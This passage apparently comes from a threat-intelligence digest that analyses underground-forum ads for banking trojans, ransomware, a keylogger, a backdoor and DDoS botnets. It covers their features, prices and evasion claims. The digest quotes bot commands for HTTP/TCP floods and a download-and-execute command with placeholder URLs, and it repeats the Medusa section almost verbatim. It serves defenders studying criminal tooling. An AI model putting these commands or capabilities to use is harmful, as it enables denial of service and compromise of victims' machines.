  • Files searching is conducted in the infected system using filters. After that files are archived (zip) and sent to malefactor’s server.
  • Formgrabber is used for stealing of authenticate data in browsers.
  • Module of grabbing FTP/POP3/SSH is used for real-time passwords stealing and sending of in to malefactor’s server.
  • Mode of proactive protection – if this mode is turned on, Trojan will block any attempts to install another malware into system.
  • Opportunity of DDoS attacks conduction (UDP, HTTP FLOOD, CONNECT-DISCONNECT FLOOD, SLOWLORIS FLOOD).

 

11.01.2014 update 1.7 was released. In this version functions of AV-killer and proactive protection bypassing have been updated. Besides, system of requests to server has been changed – became more random for difficulty of behavioral analysis of Trojan.

Functions of TOR browser formgrabbing and SSL connection with C&C have been added - Picture 4.

 

After that advertisement author periodically continued to release small updates, but users noted that author became to support his product worse than before.

In September 2014 users informed about author completely stopped to support Betabot (Pictures 5-7).

 

Analysis of new advertisement

13.05.2015 an advertisement of new version «Betabot 1.8.0.8» sale has been published on underground forum (Picture 8).

 

 

Author of this advertisement (Nightcrawler) informs that he is new owner of «Betabot» and he will support and develop this product.

Update of old versions to the latest version costs 100$.

New owner informs that he able to support only RU clients.

New version of Betabot has following functions:

  • Using of rootkit (usermode). This rootkit works on all versions of OS including Win8. Also there is optional function to use rootkit for x64.
  • Botkiller allows to uninstall competitor malware using heuristic methods and behavioral analysis.
  • System of protection against uninstalling of Trojan (adding of register keys and other methods).
  • Formgrabber allows to intercept authenticate data from browsers Internet Explorer, Firefox, Chrome. After that Trojan sorts compromised data in control panel. Malefactor can set filters to intercept from specific URL and with specific POST requests.
  • Module of FTP/MAIL grabber is used for real-time passwords stealing and sending it to C&C server. Malware also able to work with POP3 (SSL) but probability of success interception of authenticate data is about 40%.
  • Bypassing of proactive AV protection.

Malware doesn’t work with Comodo и Outpost AVs, also there are some problems with Kaspersky AV.

  • DNS redactor for interception of functions, which are responsible for DNS working in victim’s system (can be used for phishing).
  • Files searching is conducted in the infected system using filters. After that files and sent to malefactor’s server.
  • Mode of proactive protection – if this mode is turned on, Trojan will block any attempts to install another malware into system. Author recommends to use this mode if client has no goal to upload another malware software to the victim’s machine. There are three new methods of proactive protection:
  1. Blocking of BTC miners working
  2. Turning off all critical functions of previous Betabot versions
  3. Bootkits working blocking
  • Opportunity of DDoS attacks conduction (UDP, HTTP FLOOD, CONNECT-DISCONNECT FLOOD, SLOWLORIS FLOOD)
  • Opportunity to distribute bot via USB
  • Using of Socks4 servers with UPNP
  • In control panel there is new system of separation of loads into two groups for the purpose of working simplification.
  • Opportunity to upload and activate another malware software. Betabot supports uploading of CPL/DLL files, DLL launching via rundll32, also it able to inject into trusted processes.
  • Supporting up to 10 domains.
  • Function of protection against launching in virtual machine.
  • Opportunity to give to bot a command to visit URL link, install default page in browser, reset cookies, launch command via cmd.exe.
  • Opportunity to execute VBScript code in trusted processes.

Threat Details

Release of a new ransomware for Windows – «Azazel Locker»

Malware Used

  • Azazel Locker

Summary

Advertisement of a selling of a new ransomware for Windows – «Azazel Locker». It blocks working process of victim with OS Windows (x32/x64) and victim need to pay to unblock Windows. If victim inputs wrong unblocking key 5 times, Windows will be uninstalled. Also Windows will uninstalled if victim doesn’t input key during specified time.

Original Report Detail:

Advertising analysis

On 08/07/2015, an advertisement of a selling of a new ransomware for Windows – «Azazel Locker» has been published on the underground forum (Picture 1).

«Azazel Locker» is not crypto locker, it does not encrypt files on victim’s hard drive, but it blocks working process of victim with OS Windows (x32/x64) and victim need to pay to unblock Windows.

If victim inputs wrong unblocking key 5 times, Windows will be uninstalled. Also Windows will uninstalled if victim doesn’t input key during specified time.

Description of «Azazel Locker»: 

  • Works with all Windows versions (32 bit, 64 bit)
  • Small size of builder – 25 kb
  • UAC (User Account Control) bypassing
  • SmartScreen bypassing (Windows filtration system for specified files and applications)
  • Deleting Windows if victim inputs wrong key 5 times. All keys are stored in server, each key may be used only one time. After victim input correct key, Windows will be unblocked
  • Opportunity to change payment page, to add link, HTML file or payment system
  • Default function – deleting of Windows if victim doesn’t pay during 24 hours. Period of waiting may be changed.
  • Locker works in Windows save mode.
  • Locker was written with .NET.
  • Now it is undetectable by antiviruses.

Threat actor provided screenshot of «Azazel Locker» (Picture 2).

Also malefactor provided results of AV scanning, it shows that now malware is full undetectable (according to the screenshot, MD5 of sample is «3d62a93e7ba352b1b2f56062bb1ceefd») - Picture 3. 

Price of builder: 200$.

Also author sell source codes: 1000$ for each of three people, 3000$ for one person.

Author deals via escrow service.

Threat Details

Release of a new malware for OS Windows – banking bot «Axe bot»

Summary

Advertisement of a selling of a new malware – banking Trojan «Axe bot» was published on the underground forum. It has function of formgrabber and web-injects

Original Report Detail:

Advertising analysis

On 09/07/2015, an advertisement of a selling of a new malware for OS Windows – banking Trojan «Axe bot» has been published on the underground forum. Screenshot of the advertisement - Picture 1.

 

Text of the advertisement (English):

-------------------------------------------------------

Axe bot

 

Works on XP/Win7/Win8 (x86/x64) with minimal rights, only with x86 processes.

 

Socks 4/5 (backconnect).

 

Formgrabber + injects (http/https)

  • Google Chrome
  • Mozilla Firefox
  • Internet Explorer (not stable on x86)

 

Absolutely different principle of working than attack on browsers which was realized in Zeus.

Do not conduct searching based on signatures, thus continue to work after any browsers’ updates. Zeus parsers are included, completely supports Zeus’s format of injects and configs.

 

P2P

  • Updating of config file and bot file from any PC.
  • Bypasses any firewall.
  • Completely decentralized architecture.
  • Signature detection of traffic is not possible, because all traffic is encrypted with different keys.
  • Continues stable working even after 90% losses.
  • Resistance to sinkhole-attacks.
  • Uses encryption algorithm RSA1024.

 

Disadvantages:

  • Does not work if authorization with certificates is needed.
  • Detected by tracker (will be updated soon).
  • Problem with proactive detection on x64 systems.
  • Size of unpacked bot is rather big (500 kb).

 

Soon updates:

  • Completely support of x64.
  • Coding of elf/win applications for server.
  • Using p2p as TOR, with less number of hops.

 

Number of bots that communicate with C&C is approximately equals to Zeus, but survivability is better.

 

Program was written in C language.

Admin panel is convenient, written in php/mysql.

 

Does not works in Belarus/Russia/Ukraine.

Contact: axe@xmpp.jp

 

Price of builder: 2500$, escrow service.

-------------------------------------------------------

 

Main functional features of bot:

  • Formgrabber
  • Web-injects (also supports Zeus web-injects)

  • Temporary blocking of specific URLs

Threat Details

New type of iFrame injection (service)

Summary

Service of selling infected PNG file (for iFrame injection attack) was detected on underground forum. Also the author of the service sells builder for creating infected PNG

Original Report Detail:

Advertising analysis

On 03/12/2014, an advertisement of selling infected PNG has been detected on the underground forum - Picture 1.

New iFrame injection method was detected on February 2014 by Gramantik Peter. The main idea of this attack is: the iFrame was loading by valid file (a JavaScript file). The javascript downloads PNG file in which there is a code of malicious iFrame. The main danger is that antivirus software doesn’t examine a metadata of PNG file. And thus they can’t detect iframe injection attack.

Details of this attack method weren’t in public. But on December 2014 the first service of selling infected PNG was showed up.

We can consider variants with API but only with further selling the method and tying software.

The uniqueness isn’t to use iframe. The main feature is to hide part of code in the PNG file.

 

That day when antivirus scanners will start to analyze graphic with tying javascript is still far distance.

I work only on prepayment or with using escrow service (at your expensive)

PS

Guys, have a heart, have you no shame!

 

If you want to order – you should give me your jabber contact. You shouldn’t demand my jabber.

Thank you for your understanding!

------------------------------------------

 

 

Also author rents his PNG builder. He posted information about it on 16/12/2014 (Picture 3).

The topical theme.

 

This solution gives the best fit to weblocker.

Threat Details

Release of a new DDOS malware «SierenIRC»

Malware Used

  • SierenIRC

Summary

Advertisement for a sale of a new DDOS malware «SierenIRC» was detected on the underground forum. The main feature of this botnet is ability to emulate users’ actions for bypassing ddos protection (Cloudflare, DDoSGuard, Incapsula, voxility, ovh, etc.). Malefactor can control bots using IRC (an application layer protocol that facilitates communication in the form of text). According to the author of malware, one bot can generate average of 12000 requests per minute. Bot has 10 types of DDOS attack (5 http, 4 tcp, 1 udp). It was written in C# and has multitasking feature.

Original Report Detail:

Advertising Analysis

22.07.2015 an advertisement for sale of DDOS bot was posted on the underground forum (picture 1).

Malefactors for making resources in the Internet unavailable use this type of malware. Bots is controlled via IRC protocol. The main feature of DDOS bot is ability to bypass various ddos protection systems using HTTP flood. According to the author, bot can bypass any «JavaScript + Cookies based» defenses:

  • CloudFlare
  • Voxility
  • DDoSGuard

In addition, bot can bypass defense servers with «nginx cookies test module»:

  • OVH
  • Incapsula
  • net

The author of the malware tested his product on device with following characteristics: Windows OS, i5 4690K, 35mbps internet channel. He got around 800 requests per second (48000 requests per minute). In addition, he noted that the CPU usage was on around 0.5%.

Author also told that now protection from this bot does not exist.

If ddos protection counts number of requests from each IP, malefactor can slow flood. For that purpose he can put threads on one and sleep to 500, it will limit bot to two requests per second and will help to bypass ddos protection.

In case of using protection with GEO-restriction malefactor should use bots from different countries.

Bot was written in C# and has size 54kb. Another feature of the bot is ability to attack several resources at the same time (multitasking).

Bot can realize 10 types of DDOS attacks.

HTTP attacks:

  • !jsbypass {url/multiurl seperated by |} {seconds} {type} {threads} {sleep} – main attack method that can bypass any «JavaScript + Cookies based» ddos protection
  • !http {url/multiurl seperated by |} {seconds} {type} {threads} {sleep} – standard type of HTTP flood attack
  • !httpstrong {url} {seconds} {type} {threads} – the strongest type of attack, but that one can be used only for 1 URL
  • !post {url/multiurl seperated by |} {seconds} {data} {threads} {sleep} – custom HTTP POST Flood
  • !httpdrain {url/multiurl seperated by |} {seconds} {type} {threads} {sleep} – drain a huge amount of bandwidth

TCP attacks:

  • !conhold {ip} {port} {seconds} {sockets} {threads} – private method of TCP attack can down most of ddos protection systems. Using this attack malefactor can down protection «buyvmdotnet» only with 30 bots.
  • !condis {ip} {port} {seconds} {sockets} {threads} – custom TCP attack, same as !conhold, less obvious but does less damage, can also work to bypass some protections and go to back-end
  • !tcpsmash {ip} {port} {seconds} {sockets} {threads} {size} – custom TCP attack that destroys most protections
  • !rawtcp {ip} {port} {seconds} {size} {threads} – basic TCP attack.

UDP attacks:

  • !rawudp {ip} {port} {seconds} {size} {threads} – basic UDP attack.

The bot, which is uploaded to the victim’s machine, has some defense features:

  • Process Persistence
  • Registry Persistence
  • Hidden Startup
  • Stable, each attack uses a maximum of 1% CPU on i5 4690k

Another user of forum («demiurge») posted 29.07.2015 second advertisement of malware (picture 2).

Actor «demiurge» is seller of the bot on the Russian forums.

30.07.2015 the botnet was tested by user «POCT». He is administrator of another underground forum «fuckav.ru». Because of DDOS attack, his resource «fuckav.ru» was unavailable. In addition, he noted that he could not resist the DDOS attack. It is significant to note that «fuckav.ru» uses cloudflare.com service.

Price of the malware for first five customers is $1500. After that, he will increase the price to $2500. So far, he sold two copies of malware.

  • The main feature of this botnet is ability to emulate users’ actions for bypassing ddos protection. Thus it can lead to potential threat of disablement of resources which are belonged to big companies and banks, because they usually using standard ddos protection systems.
  • In case of unavailable of Internet resources, malefactor can create phishing copies of sites for compromising authentication data of users. It can lead to financial and reputational risks.
  • There are good review about malware from administration of another forum. It means that malware has good quality and may lead to popularity of the malware.

Threat Details

Release of new malware «Keyer»

Malware Used

  • Keyer

Summary

On March 2015, an advertisement for new malware «Keyer» was posted on the underground forum. Initially the malware was meant for logging user’s action on victim’s machine and transferring compromised data to malefactors’ servers. However, in June 2015 the author added feature of remote control of victim’s machines. This enabled malefactors to create botnets. At present Trojan can be used as loader malware (for uploading and starting other malicious files). The author continues to develop his product.

Original Report Detail:

Advertising Analysis

15.03.2015 an advertisement for keylogger «Keyer» was posted on the underground forum (picture 1).

Initially the malware has only features of keylogger: logging user’s actions and transferring compromised data to malefactors’ servers.

The malware was written in C++ and had 19 kb size. The developer noted that customers can very easy crypt the malware for decreasing probability of detection by antiviruses.

Author also noted following main features:

  • Transfer compromised data to the server, when log file will have definite size
  • Defense from starting on virtual machines
  • Defense from reverse engineering
  • Support Unicode and various alphabets
  • Possibility to start from memory

Compromised data is saved in XML and have following form (picture 2).

Compromised date transfer to the server in encrypted form. Folder was created on server for every compromised device. Keylogger’s logs is sorted by date. On the moment of creation of the post, following antiviruses couldn’t detect the Trojan:

  • Kaspersky  
  • Avira  
  • Nod32  
  • Microsoft Security Essentials
  • Norton 360
  • Fortinet
  • AVG  

Price of the first version is $40.

On April 2015, the developer made small updates of malware: auto-decryption of compromised data, sending of blank message in the time of compromising of victim’s machine, auto-checking of updates.

On May 2015, he announced web-panel for remote control of bots.

On 13.06.2015, the developer posted message about innovation in the new Trojan:

  • Release of admin panel with ability to command bots and group them using filters (country, ip address, administrator mode)
  • Ability to examine compromised date in admin panel
  • Support several C&C servers
  • Ability to change C&C server by remote command
  • Self-deleting the Trojan, in case of unavailable of C&C server (optional)
  • Detailed bots’ statistics

On 23.06.2015, the developer posted message that the update was completed (picture 3).

The main feature of update is ability to receive various commands from malefactors. Thus, malefactors can create botnets.

Price of new malware is $100. List of command below:

  • Delete Trojan from victim’s machine
  • Upload and start other malicious files
  • Change C&C server

On 10.07.2015, form of logs was changed (picture 4).

In addition, the author noted that the new size of Trojan is 12 kb.

Customers of malware noted that antiviruses couldn’t detect the Trojan during long time.

On 06.08.2015, the developer added ability to search determine text in logs. In addition, he posted some screenshots of admin panel (pictures 5,6,7,8,9).

Threat Details

Malware «Visconti Backdoor»

Malware Used

  • Visconti Backdoor

Summary

Advertisement for selling of malware «Visconti Backdoor» for hidden control of victim’s machine and getting data from it was published on underground forum. Now actual version of the product – 8.0.1.6, author continues to update and support his soft

Original Report Detail:

Chronology of development

On 31/12/2013 threat actor Visconti published an advertisement about start of selling of new malware - «Visconti Backdoor». Further soft was updated, selling is relevant now (Picture 1).

Text of the advertisement (English):

-------------------------------------------------------

Glad to present to you backdoor based on legitimate soft - Visconti Backdoor!

Based on Remote Manipulator System (RMS).

Backdoor has hidden installation, it fixes in the system as a legal soft.

Excellent variant for establishing of full hidden access to PC without victim’s suspicion of it.

 

Functions:

  1. Works bypassing NAT
  2. Hidden installation
  3. Managing via client application
  4. Doesn’t use standard MSI, direct installation without any «footprints»
  5. Absence of limits (no connection with original product and its’ developers)
  6. Own installer
  7. Own design
  8. Hidden RDP

------

Advantages of parallel session in RDP:

  1. Using of standard Microsoft RDP protocol
  2. Doesn’t use any .dll libraries
  3. Parallel hidden working in the session of active user
  4. Support of settings and contents of browser of active user (cookie, sol, java)
  5. Support of client’s programs like ICQ messengers, Viber, Jabber clients, Skype, etc.
  6. Working in Internet from user’s IP
  7. Supporting of USB-Flash and network drive
  8. Settings of quality and speed

Supporting of all Windows versions

+ win xp home,professional x86
+ win vista starter, home premium, business, ultimate, enterprise x86 x86-64
+ win 7 home basic, home premium,professional,ultimate,enterprise x86 x86-64
+ win 8 pro,enterprise, developer preview, consumer preview, release preview x86 x86-64
+ win 8.1 preview, professional, enterprise x86-64
+ win 10 technical preview x86-64

------

 

  1. Full supporting of Windows XP\Vista\7\8\8.1\10 x86-64 and server systems
  2. Separate exe for uninstalling from the system
  3. ID for connect is sent to email
  4. UAC bypassing
  5. Connect via official servers of developer
  6. Connect via selected servers
  7. Working with rights of administrator and user (HKLM and HKCU autostart)

 

Available actions:

  1. Control and watching of victim’s desktop (shows video and quality settings)
  2. Supporting of Aero in Windows 7 (high quality of working)
  3. Supporting of multimonitor systems and terminal users (ability to choose user to spy in case of several users)
  4. Webcam capture (ability to choose in case there are several cameras) and sound capture (speakers/microphone), drawback is that need admin rights
  5. CMD console
  6. File manager
  7. Launching of files (ability to launch files directly from file manager)
  8. Capturing and transference of the clipboard
  9. Task manager with ability to terminate Windows Services and processes
  10. Regedit
  11. Sheduled recording of desktop video
  12. Sending message to desktop
  13. Shutdown, reboot, sleeping mode, monitor turn off

 

Demonstration video: visconti.in

 

Pack of selling: builder, administrative panel (Viewer), patch of parallel session RDP, Loader, User’s manual (txt), Product documentation, Uninstaller of builder from the system.

Pack is completely configurated and ready for use.

 

Price: lifetime License with author’s support = 2500$

Contacts: visconti@exploit.im (OTR), PM.

-------------------------------------------------------

 

Described functions are relevant for the latest version of soft (v. 8.0.1.6), first version had less functions.

 

In the period beginning 2014 – present author released several updates for his product.

 

27.12.2014 – version 6.0.0.4. Main features: new dropper, new .dll, updates in .bat, update of RDP, new design, own installer and uninstaller, update of self-uninstall function (Picture 2).

02.03.2015 – version 7.0.0.8. Main features: UAC bypass, update of parallel session on Win 7, added parallel session on Win Vista and Win 8 (Picture 3).

10.03.2015 –additional update of ver. 7.0.0.8 (Picture 4).

27.06.2015 – version 8.0.1.6. Main features: new patch RDP (full undetectable), supporting of parallel sessions on Win 8.1, Win 10 (Picture 5).

Thus, the latest relevant version of Visconti Backdoor is 8.0.1.6.

19.07.2015 author informed that selling are relevant and now he is preparing new update (Picture 6).

Comments about the product

Mainly, comments of clients are positive. At the beginning period of product’s development there were some disadvantages which were later.

Also clients notice that author always supports his soft and answer on questions about his product.

Threat Details

Release of new DDOS malware «Medusa»

Malware Used

  • Medusa

Summary

Advertisement for a sale of new DDOS malware «Medusa» was detected on the underground forum. Malefactor can control bots using IRC (an application layer protocol that facilitates communication in the form of text). The Trojan specializes in HTTP-attacks. The developer notes that in the presence of 100 bot, botnet can generate 25000 requests per second. The malware can bypass proactive defense systems of antiviruses, as well as resist deleting by user or other Trojans with «botkill» feature.

Original Report Detail:

Advertising Analysis

18.08.2015 an advertisement for sale of DDOS bot was posted on the underground forum (picture 1).

The malware is meant for making resources in the Internet unavailable. Bots are controlled via IRC protocol. The Trojan specializes in HTTP-attacks. At present Trojan can realize following types of attacks:

  • Httpstrong – custom HTTP-attack (in the presence of 100 bot it can destroy ddos-guard protection)
  • Httpseebix – lets change HTTP headers: «Referer» and «User-Agent», as well as change the request
  • smartflood – lets bypass cookie-protection, automatic cookie grabbing
  • httppost – generates random content in the POST form

The author notes that though the Trojan uses NET 2.0, bot has a good chance to integrate in the system. However, crypters are required for «startup» in the system and increasing probability of infection. The chance of infection will be 80-90% using crypters.

In case of using 100 bots from developing countries, the power of attack will be 20000-25000 requests per second (peak values – 30000 requests).

In addition, the author posted screenshot of attack power of three bots from developed countries. Power of three bots was 3000 requests per second (picture 2).

Bot has features of persistence in the victim’s system:

  • Defense from proactive systems
  • Defense from deleting by user
  • Defense from other Trojans with «Botkiller» feature

The developer plans to add features of TCP and UDP attacks, which can bypass most of defense systems, including OVH. The developer also posted list with commands for bots:

  • login [password] (for controlling bot the malefactor should log in IRC canal using IP-address which was given with build; thus botnet can’t be used by other people)
  • logout
  • leave (disconnect bots from IRC server until user will restart system; the Trojan should stay in «Startup» for reconnection, crypter should provide it)
  • httpstrong www.domain.com page threads //example: «httpstrong www.url.com lol.php 10» (http strong attack)
  • stop-httpstrong (stop http strong attack)
  • httppost www.domain.com page threads //example: «httppost www.url.com lol.php 10» (http post attack)
  • stop-httppost (stop http post attack)
  • httpseebix www.domain.com page threads //example: «httpseebix www.url.com lol.php 10» (http seebix attack)
  • stop-httpseebix (stop http seebix attack)
  • smartflood GET www.domain.com page.php threads //example: «smartflood GET www.domain.com.com lol.php 10» (smart flood attack)
  • stop-smartflood (stop smartflood attack)
  • stop-all (stop all flood attacks)
  • silent on (forbid bots response to received commands)
  • silent off (allow bots to send results of commands)
  • download link filename.exe true (download and start file; start only with «True» flag)//example: «download www.url.com/elol.jpg file true»
  • join #channel (transfer bots in specified canal) //example: «join #lol123
  • update 2.5 link filename» (update specified file)//example: «update 2.5 www.url.com/elol.exe poops.exe»
  • resetnick (change nicks of bots)

User «Hermeus» is in charge of sale and support of bot. He tested botnet with 100 infected machines. He noted following things:

  • Resources blog.dota2.com and eu.battle.net were half out of order
  • It can simply put out of action ovh.ie
  • It can put out of action proxy-base.com (site has own protection system)
  • It almost puts out of action ddos-guard.net

He also posted screenshots, which are shown unavailable of sites, which were attacked by botnet:

  1. starbucks.com (10:15:30, 18.08.2015) – 232 bots were used (picture 3).
  1. www.ovh.ie (10:19:13, 18.08.2015) – 223 bots were used (picture 4).
  1. echo.msk.ru (10:22:14, 18.08.2015) – 219 bots were used (picture 5).

Threat Details

Release of new DDOS malware «Medusa»

Malware Used

  • Medusa

Summary

Advertisement for a sale of new DDOS malware «Medusa» was detected on the underground forum. Malefactor can control bots using IRC (an application layer protocol that facilitates communication in the form of text). The Trojan specializes in HTTP-attacks. The developer notes that in the presence of 100 bot, botnet can generate 25000 requests per second. The malware can bypass proactive defense systems of antiviruses, as well as resist deleting by user or other Trojans with «botkill» feature.

Original Report Detail:

Advertising Analysis

18.08.2015 an advertisement for sale of DDOS bot was posted on the underground forum (picture 1).

The malware is meant for making resources in the Internet unavailable. Bots are controlled via IRC protocol. The Trojan specializes in HTTP-attacks. At present Trojan can realize following types of attacks:

  • Httpstrong – custom HTTP-attack (in the presence of 100 bot it can destroy ddos-guard protection)
  • Httpseebix – lets change HTTP headers: «Referer» and «User-Agent», as well as change the request
  • smartflood – lets bypass cookie-protection, automatic cookie grabbing
  • httppost – generates random content in the POST form

The author notes that though the Trojan uses NET 2.0, bot has a good chance to integrate in the system. However, crypters are required for «startup» in the system and increasing probability of infection. The chance of infection will be 80-90% using crypters.

In case of using 100 bots from developing countries, the power of attack will be 20000-25000 requests per second (peak values – 30000 requests).

In addition, the author posted screenshot of attack power of three bots from developed countries. Power of three bots was 3000 requests per second (picture 2).

Bot has features of persistence in the victim’s system:

  • Defense from proactive systems
  • Defense from deleting by user
  • Defense from other Trojans with «Botkiller» feature

The developer plans to add features of TCP and UDP attacks, which can bypass most of defense systems, including OVH. The developer also posted list with commands for bots:

  • login [password] (for controlling bot the malefactor should log in IRC canal using IP-address which was given with build; thus botnet can’t be used by other people)
  • logout
  • leave (disconnect bots from IRC server until user will restart system; the Trojan should stay in «Startup» for reconnection, crypter should provide it)
  • httpstrong www.domain.com page threads //example: «httpstrong www.url.com lol.php 10» (http strong attack)
  • stop-httpstrong (stop http strong attack)
  • httppost www.domain.com page threads //example: «httppost www.url.com lol.php 10» (http post attack)
  • stop-httppost (stop http post attack)
  • httpseebix www.domain.com page threads //example: «httpseebix www.url.com lol.php 10» (http seebix attack)
  • stop-httpseebix (stop http seebix attack)
  • smartflood GET www.domain.com page.php threads //example: «smartflood GET www.domain.com.com lol.php 10» (smart flood attack)
  • stop-smartflood (stop smartflood attack)
  • stop-all (stop all flood attacks)
  • silent on (forbid bots response to received commands)
  • silent off (allow bots to send results of commands)
  • download link filename.exe true (download and start file; start only with «True» flag)//example: «download www.url.com/elol.jpg file true»
  • join #channel (transfer bots in specified canal) //example: «join #lol123
  • update 2.5 link filename» (update specified file)//example: «update 2.5 www.url.com/elol.exe poops.exe»
  • resetnick (change nicks of bots)

User «Hermeus» is in charge of sale and support of bot. He tested botnet with 100 infected machines. He noted following things:

  • Resources blog.dota2.com and eu.battle.net were half out of order
  • It can simply put out of action ovh.ie
  • It can put out of action proxy-base.com (site has own protection system)
  • It almost puts out of action ddos-guard.net

He also posted screenshots, which are shown unavailable of sites, which were attacked by botnet:

  1. starbucks.com (10:15:30, 18.08.2015) – 232 bots were used (picture 3).
  1. www.ovh.ie (10:19:13, 18.08.2015) – 223 bots were used (picture 4).
  1. echo.msk.ru (10:22:14, 18.08.2015) – 219 bots were used (picture 5).
  1. yandex.ru (10:24:20, 18.08.2015) – 218 bots were used (picture 6).
  1. blockchain.info (10:26:41, 18.08.2015) – 216 bots were used (picture 7).
  1. voxility.com (10:10:55, 18.08.2015) – 240 bots were used (picture 8).

Another user «hack3core» also tested this bot and noted: «In a short time, this software will became pot of gold ». Price of this malware is very low – $600.
